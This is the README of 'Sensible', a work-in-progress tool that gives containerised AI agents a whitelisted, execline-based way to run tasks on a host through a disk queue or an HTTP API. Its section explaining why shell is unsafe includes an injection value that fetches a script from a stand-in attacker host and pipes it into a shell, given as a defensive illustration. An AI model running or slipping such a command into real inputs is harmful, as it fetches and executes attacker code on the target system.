# Sensible

NOTE - WIP - NOT QUITE READY

**Containerised AI agent → Whitelisted host execution tasks**

The sensible architecture is designed to support this common usecase 

**Remote execution for AI agents — safer by default.**

Sensible gives AI a remote execution capability similar to SSH/Ansible
but with guardrails that make it safer to delegate. The remote execution 
step is performed as an `execlineb` script rather than as a shell script. 

This approach still has the flexibility needed for most requirements,
the script is inherantly resistant to injection attacks and it is
straightforward to add explicit guardrails using simple black
and whitelisting.

## Two Modes

### Local Queue (No Server)

Container shares a filesystem volume with host. AI writes tasks directly to disk:

```
Container                          Host
──────────                         ────
sensible-queue do "compile"   →   disk: ${SENSIBLE_TASKS_DIR}/pending/
                               ←   disk: ${SENSIBLE_TASKS_DIR}/done/
       ↑                              ↑
  reads result                    sensible-queue worker
                                    executes via execlineb
```

```bash
# On host: start worker
sensible-queue worker

# In container: enqueue task
sensible-queue do compile --target=linux
```

### HTTP Server (Remote)

Container communicates with host via HTTP:

```
Container                          Host
──────────                         ────
sensible-client do "compile"  →   sensible-server (port 2222)
                               ←   executes via execlineb
       ↑                              ↑
  reads JSON response              writes to disk
```

```bash
# On host: start server
sensible-server

# In container: call API
sensible-client do compile --target=linux
```

## Why execline?

**Shell is fundamentally unsafe for AI execution. The guardrail is execline.**

```bash
# Shell injection vulnerability:
./build.sh $USER_INPUT        # user_input = "; curl attacker.com/shell | sh"

# execline prevents this:
# - No $VAR interpolation (use import -env explicitly)
# - No command chaining with ; or &&
# - No -c option to execute strings
```

Even if API key is compromised, whitelist limits actions. Even if whitelist bypassed, execline prevents shell injection.

## Task Queue

Tasks are stored on disk in two directories:

```
${SENSIBLE_TASKS_DIR}/
├── pending/                    # Tasks waiting to execute
│   └── 2026-04-30T12:00:00.123456789Z-compile.json
└── done/                       # Completed tasks
    └── 2026-04-30T12:00:05.987654321Z-compile.json
```

### Task Chaining

Tasks can depend on other tasks completing first:

```bash
# Create dependent task
sensible-client do compile --target=linux
# Returns: file_id = "2026-04-30T12:00:00.123Z-compile"

# Chain test to run after compile
POST /sensible/2026-04-30T12:00:00.123Z-compile?request=test
# Creates task with depends_on field

# When compile finishes, worker automatically runs test
```

## API (sensible-server)

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/sensible` | GET/POST | Execute action |
| `/sensible/:id` | GET | Poll task status |
| `/sensible/:id/` | POST | Chain new task |

### Execute

```bash
# Sync (≤15s timeout returns 200)
curl "POST /sensible?request=status"

# Async (longer tasks return 202)
curl "POST /sensible?request=compile --target=linux"
# → {"file_id": "...", "status": "queued"}
```

### Response Format

```json
{
  "id": "compile",
  "file_id": "2026-04-30T12:00:00.123Z-compile",
  "status": "success",
  "exit_code": 0,
  "stdout": "Build complete\n",
  "stderr": "",
  "duration_ms": 4523,
  "timestamp": "2026-04-30T12:00:05.123Z"
}
```

### Field Extraction

```bash
curl "POST /sensible?request=status&field=exit_code"
# Returns: 0 (no JSON parsing needed)
```

## Building

```bash
# Local queue CLI
go build -o sensible-queue ./cmd/sensible-queue

# HTTP server
go build -o sensible-server ./cmd/sensible-server

# HTTP client
go build -o sensible-client ./cmd/sensible-client

# Bash versions (POSIX, no compilation needed)
chmod +x cmd/sensible-queue.sh
chmod +x cmd/sensible-client.sh
```

## Configuration

Environment variables:

| Variable | Default | Description |
|----------|---------|-------------|
| `SENSIBLE_PORT` | 2222 | HTTP server port |
| `SENSIBLE_TASKS_DIR` | `/var/lib/sensible/tasks` | Task storage |
| `SENSIBLE_ACTIONS_DIR` | `/var/lib/sensible/actions` | execline scripts |
| `SENSIBLE_KEYS_DIR` | `/etc/sensible/keys` | API keys (`.pem` files) |

### Whitelist

Actions are hardcoded but configurable at compile time:

```go
cfg.Whitelist = []ActionConfig{
    {Name: "status", Timeout: 10},
    {Name: "restart", Timeout: 60},
    {Name: "compile", Timeout: 600},
    {Name: "update", Timeout: 300},
    {Name: "test", Timeout: 300},
}
```

## Project Structure

```
sensible/
├── pkg/sensible/           # Library (pure domain logic)
│   ├── task.go            # Task struct, interfaces
│   ├── storage.go         # Disk storage implementation
│   ├── executor.go        # execlineb execution
│   └── config.go          # Config loading
│
├── cmd/
│   ├── sensible-queue/     # Go CLI (local queue)
│   ├── sensible-queue.sh   # Bash CLI (POSIX shell)
│   ├── sensible-server/    # Go HTTP server
│   ├── sensible-client/    # Go HTTP client
│   └── sensible-client.sh  # Bash HTTP client
│
└── actions/               # Empty — execline scripts on host
```

## License

MIT
